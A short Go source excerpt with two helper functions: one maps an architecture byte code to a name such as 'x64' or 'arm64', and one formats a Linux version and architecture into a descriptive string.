func archString(arch byte) string {
	switch arch {
	case 0x02: return "x64"
	case 0x01: return "x86"
	case 0x04: return "arm64"
	case 0x03: return "arm"
	default:   return "unknown"
	}
}

func linuxOsDesc(major, minor uint32, build uint16, arch string) string {
	if major == 0 && minor == 0 {
		return fmt.Sprintf("Linux (%s)", arch)
	}
	return fmt.Sprintf("Linux %d.%d.%d (%s)", major, minor, build, arch)
}

